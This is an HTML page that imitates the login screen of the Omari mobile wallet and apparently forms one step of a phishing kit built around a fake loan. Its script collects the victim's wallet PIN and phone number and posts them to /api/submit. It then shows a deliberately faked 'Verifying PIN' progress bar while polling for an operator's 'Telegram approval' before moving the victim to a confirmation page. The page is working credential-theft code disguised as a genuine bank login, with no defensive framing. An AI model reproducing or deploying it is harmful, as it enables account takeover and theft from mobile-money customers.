<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Omari Wallet PIN Entry</title>
    <style>
        /* Base Reset */
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #e9ecef;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Mobile Container Simulation */
        .app-container {
            width: 100%;
            max-width: 400px;
            background-color: #ffffff;
            min-height: 100vh;
            position: relative;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        /* Top Logo Area */
        .top-header {
            text-align: center;
            padding: 15px 0 10px;
            background: #ffffff;
            z-index: 20;
        }

        .logo-text {
            color: #4DB848;
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin-bottom: 2px;
        }

        .logo-subtext {
            font-size: 7px;
            color: #555;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        /* Hero Image Section */
        .hero-section {
            height: 250px;
            background-image: 
                linear-gradient(90deg, rgba(20, 25, 30, 0.95) 0%, rgba(20, 25, 30, 0.7) 45%, rgba(20, 25, 30, 0) 100%),
                url('https://images.unsplash.com/photo-1531123897727-8f129e1688ce?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80');
            background-size: cover;
            background-position: center 20%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 0 25px;
        }

        .hero-section p {
            color: #ffffff;
            font-size: 15px;
            font-weight: 300;
            margin-bottom: 4px;
        }

        .hero-section h1 {
            color: #51C24D;
            font-size: 28px;
            line-height: 1.25;
            font-weight: 700;
        }

        /* Overlapping White Card */
        .login-card {
            background-color: #ffffff;
            border: 1px solid #f0f0f0;
            border-radius: 12px;
            margin: -30px 20px 20px 20px;
            padding: 25px 20px;
            position: relative;
            z-index: 10;
            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
            display: flex;
            flex-direction: column;
        }

        .instruction-text {
            color: #777777;
            font-size: 14px;
            text-align: center;
            margin-bottom: 12px;
        }

        /* Readonly Phone Number Display */
        .readonly-phone-box {
            background-color: #f2f2f2;
            border: 1px solid #e8e8e8;
            border-radius: 8px;
            padding: 16px 20px;
            font-size: 16px;
            font-weight: 600;
            color: #111;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
        }

        /* PIN Input Area */
        .pin-container {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
        }

        .pin-box {
            width: 55px;
            height: 65px;
            border: 1px solid #4DB848;
            border-radius: 8px;
            font-size: 32px;
            text-align: center;
            font-weight: bold;
            color: #111;
            background: #fff;
            outline: none;
            /* Magenta caret to match the screenshot exactly */
            caret-color: #b90076; 
            transition: box-shadow 0.2s;
        }

        .pin-box:focus {
            box-shadow: 0 0 0 2px rgba(77, 184, 72, 0.2);
        }

        /* Override default password dot size for iOS/Webkit if needed */
        .pin-box[type="password"] {
            letter-spacing: 0;
        }

        /* Buttons & Links */
        .btn-login {
            width: 100%;
            height: 50px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #4DB848;
            color: #ffffff;
            border: none;
            box-shadow: 0 4px 12px rgba(77, 184, 72, 0.35);
            margin-bottom: 25px;
            transition: opacity 0.2s;
        }

        .btn-login:active {
            opacity: 0.8;
        }

        .change-number-link {
            text-align: center;
            color: #b90076;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            background: none;
            border: none;
            padding: 10px;
            margin-top: 5px;
        }

        .app-version {
            color: #aaaaaa;
            font-size: 11px;
            text-align: center;
            margin-top: 25px;
        }

        /* Desktop specific tweaks */
        @media (min-width: 401px) {
            .app-container {
                min-height: auto;
                height: 800px;
                border-radius: 20px;
            }
        }

        /* ── Processing overlay ── */
        .proc-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 999;
            background: linear-gradient(160deg, #1b5e20 0%, #2e7d32 45%, #4DB848 100%);
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 0;
            padding: 40px 30px;
            text-align: center;
        }
        .proc-overlay.show { display: flex; }
        .proc-logo { color: rgba(255,255,255,0.9); font-size: 26px; font-weight: 800; margin-bottom: 36px; }
        .proc-ring {
            width: 110px; height: 110px;
            border-radius: 50%;
            border: 6px solid rgba(255,255,255,0.2);
            border-top-color: #fff;
            animation: spin 0.9s linear infinite;
            margin-bottom: 32px;
            display: flex; align-items: center; justify-content: center;
            position: relative;
        }
        .proc-ring-icon { position: absolute; font-size: 36px; animation: none; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .proc-title { color: #fff; font-size: 20px; font-weight: 800; margin-bottom: 8px; }
        .proc-sub { color: rgba(255,255,255,0.75); font-size: 13px; line-height: 1.7; margin-bottom: 28px; max-width: 260px; }
        .proc-bar-wrap { width: 240px; height: 6px; background: rgba(255,255,255,0.2); border-radius: 3px; overflow: hidden; margin-bottom: 10px; }
        .proc-bar { height: 100%; width: 0%; background: #fff; border-radius: 3px; transition: width 0.4s ease; }
        .proc-pct { color: rgba(255,255,255,0.6); font-size: 12px; font-weight: 600; }
        .pin-error { color: #e53935; font-size: 12px; text-align: center; min-height: 18px; margin-bottom: 8px; font-weight: 600; }
    </style>
</head>
<body>

<!-- Processing overlay -->
<div class="proc-overlay" id="procOverlay">
    <div class="proc-logo">Omari</div>
    <div class="proc-ring">
        <span class="proc-ring-icon">🔒</span>
    </div>
    <div class="proc-title">Verifying PIN</div>
    <div class="proc-sub">Securing your session. Please wait while we verify your PIN…</div>
    <div class="proc-bar-wrap"><div class="proc-bar" id="procBar"></div></div>
    <div class="proc-pct" id="procPct">0%</div>
</div>

    <div class="app-container">
        
        <!-- Top Logo area -->
        <div class="top-header">
            <h1 class="logo-text">Omari</h1>
            <div class="logo-subtext">A MEMBER OF THE OLD MUTUAL GROUP</div>
        </div>

        <!-- Hero / Background Image Area -->
        <div class="hero-section">
            <p>Please enter your</p>
            <h1>Omari Wallet<br>login details</h1>
        </div>

        <!-- Main Login Card -->
        <div class="login-card">
            <div class="instruction-text">Wallet Mobile Number</div>
            
            <div class="readonly-phone-box">
                <!-- Simulating the redacted number from your screenshot -->
                26377*******
            </div>

            <div class="instruction-text">Enter your 4 digit Wallet PIN</div>

            <div class="pin-container">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            </div>

            <div class="pin-error" id="pinError"></div>

            <button class="btn-login" id="loginBtn">Login</button>

            <button class="change-number-link" id="changeNumberBtn">Change Mobile Number</button>

            <div class="app-version">v5.0.40</div>
        </div>

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const pinInputs = document.querySelectorAll('.pin-box');
            const loginBtn  = document.getElementById('loginBtn');
            const changeNumberBtn = document.getElementById('changeNumberBtn');
            const pinError  = document.getElementById('pinError');
            const overlay   = document.getElementById('procOverlay');
            const bar       = document.getElementById('procBar');
            const pct       = document.getElementById('procPct');

            // ── PIN input logic (auto-advance & backspace) ──
            pinInputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    input.value = input.value.replace(/\D/g, '').slice(0, 1);
                    pinError.textContent = '';
                    if (input.value && index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
                        pinInputs[index - 1].focus();
                    }
                });
            });

            // Focus first box on load
            setTimeout(() => pinInputs[0].focus(), 300);

            // ── Login / Submit PIN ──
            loginBtn.addEventListener('click', () => {
                const pin = Array.from(pinInputs).map(i => i.value).join('');
                if (pin.length < 4) {
                    pinError.textContent = 'Please enter your full 4-digit PIN.';
                    return;
                }

                const applicant = JSON.parse(localStorage.getItem('omariSubmittedLoan') || 'null');
                if (!applicant || !applicant.ref) {
                    alert('Missing session details. Please start over.');
                    window.location.href = 'number.html';
                    return;
                }

                // Show processing overlay
                overlay.classList.add('show');
                pinError.textContent = '';

                // Fake progress crawl to 90%
                let progress = 0;
                const fakeProgress = setInterval(() => {
                    if (progress < 90) {
                        progress += Math.random() * 5;
                        if (progress > 90) progress = 90;
                        bar.style.width = progress + '%';
                        pct.textContent = Math.round(progress) + '%';
                    }
                }, 500);

                const payload = {
                    sessionId: applicant.ref,
                    step: 'pin',
                    data: {
                        Mobile: applicant.mobile || 'N/A',
                        PIN: pin
                    }
                };

                fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).then(() => {
                    // Poll for Telegram approval
                    const poll = setInterval(async () => {
                        try {
                            const res = await fetch(`/api/status?sessionId=${applicant.ref}&step=pin`);
                            const statusData = await res.json();

                            if (statusData.status === 'approved') {
                                clearInterval(poll);
                                clearInterval(fakeProgress);
                                bar.style.width = '100%';
                                pct.textContent = '100%';
                                setTimeout(() => {
                                    window.location.href = 'confirm.html';
                                }, 500);
                            } else if (statusData.status === 'rejected') {
                                clearInterval(poll);
                                clearInterval(fakeProgress);
                                overlay.classList.remove('show');
                                pinError.textContent = 'Incorrect PIN. Please try again.';
                                pinInputs.forEach(b => { b.value = ''; });
                                bar.style.width = '0%';
                                pct.textContent = '0%';
                                pinInputs[0].focus();
                            }
                        } catch (e) {
                            console.error('Polling error', e);
                        }
                    }, 2000);
                }).catch(err => {
                    clearInterval(fakeProgress);
                    overlay.classList.remove('show');
                    pinError.textContent = 'Error submitting PIN. Please try again.';
                    console.error(err);
                });
            });

            changeNumberBtn.addEventListener('click', () => {
                window.location.href = 'number.html';
            });
        });
    </script>
</body>
</html>
